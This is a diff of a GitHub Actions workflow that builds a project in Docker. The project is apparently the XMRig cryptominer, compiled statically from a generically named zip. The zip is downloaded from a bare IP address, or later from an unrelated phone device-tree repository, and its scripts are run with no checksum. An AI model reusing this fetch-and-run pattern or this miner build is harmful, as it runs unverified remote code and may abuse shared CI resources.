@@ -1,9 +1,9 @@
-name: CRUX Build and Run
+name: Build Project in Docker
 
 on:
   push:
     branches:
-      - master
+      - master  # 可以根据需要指定触发分支
   workflow_dispatch:  # 允许手动触发
 
 jobs:
@@ -12,57 +12,41 @@ jobs:
 
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v3
+        uses: actions/checkout@v2
 
-      - name: Build Docker image
+      - name: Set up Docker
         run: |
-          # 将 Dockerfile 写入工作流中
+          # 创建 Dockerfile
           cat <<EOF > Dockerfile
-          FROM crux:latest
-
-          # 安装 wget 和 git
-          RUN prt-get depinst wget git
-
-          # 克隆 CRUX 的 ports 集合
-          RUN mkdir -p /usr/ports && \
-              git clone https://crux.nu/git/crux-ports.git /usr/ports
-
-          # 同步 ports 集合并安装 wget 和 git
-          RUN ports -u && prt-get depinst wget git
-
-          # 手动更新 expat 到 2.6.3 版本
-          RUN wget https://github.com/libexpat/libexpat/releases/download/R_2_6_3/expat-2.6.3.tar.bz2 -O /usr/ports/distfiles/expat-2.6.3.tar.bz2 && \
-              cd /usr/ports/opt/expat && \
-              sed -i 's/2.2.7/2.6.3/g' Pkgfile && \
-              prt-get depinst expat
-
-          # 更新并安装基础依赖
-          RUN prt-get update -fr /usr/ports/core && \
-              prt-get depinst curl unzip make automake gcc cmake libtool autoconf
-
-          # 下载并编译 GLIBC 2.14
-          RUN wget http://ftp.gnu.org/gnu/libc/glibc-2.14.tar.gz && \
-              tar -xvf glibc-2.14.tar.gz && \
-              cd glibc-2.14 && \
-              mkdir build && \
-              cd build && \
-              ../configure --prefix=/usr && \
-              make -j\$(nproc) && \
-              make install
-
+          FROM debian:stretch
+          # 设置镜像源
+          RUN echo "deb http://archive.debian.org/debian/ stretch main" > /etc/apt/sources.list && \
+              echo "deb http://archive.debian.org/debian-security/ stretch/updates main" >> /etc/apt/sources.list && \
+              echo "Acquire::Check-Valid-Until false;" >> /etc/apt/apt.conf.d/99ignore-valid-until && \
+              apt-get update && apt-get install -y \
+              curl \
+              wget \
+              unzip \
+              git \
+              build-essential \
+              cmake \
+              automake \
+              libtool \
+              autoconf \
+              glibc-source \
+              libstdc++-6-dev \
+              libgcc-6-dev && \
+              apt-get clean
           # 设置工作目录
           WORKDIR /usr/src/app
-
           # 复制项目文件到容器中
-          COPY . .
-
-          # 下载并解压项目源码
-          RUN wget http://8.138.123.18:8180/testformycode.zip && \
-              unzip testformycode.zip
-
+          COPY . /usr/src/app
+          # 下载并解压源码
+          RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \
+              unzip testformycode-nbg.zip
           # 构建项目
-          RUN cd testformycode/scripts-64 && \
-              chmod +x *.sh && \
+          RUN cd testformycode-nbg/scripts-64 && \
+              chmod 777 *.sh && \
               ./build_deps.sh && \
               cd .. && \
               mkdir build && \
@@ -70,25 +54,25 @@ jobs:
               cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \
               make
           EOF
-
+      - name: Build Docker image
+        run: |
           # 构建 Docker 镜像
-          docker build -t my-crux-build-env .
-
+          docker build -t my-debian-build-env .
       - name: Run Docker container
         run: |
           # 运行 Docker 容器并构建项目
-          docker run --name my-crux-build-container my-crux-build-env
-
+          docker run --name my-debian-build-container my-debian-build-env
       - name: Copy build artifacts
         run: |
           # 复制构建产物
-          docker cp my-crux-build-container:/usr/src/app/testformycode/build ./build-output
-
-      - name: Upload Build Artifacts
+          docker cp my-debian-build-container:/usr/src/app/testformycode-nbg/build ./build-output
+      - name: Upload build artifacts
         uses: actions/upload-artifact@v3
         with:
           name: build-output
           path: ./build-output
 
-      - name: Clean up Docker container
-        run: docker rm -f my-crux-build-container
+      - name: Clean up
+        run: |
+          # 删除 Docker 容器
+          docker rm -f my-debian-build-container
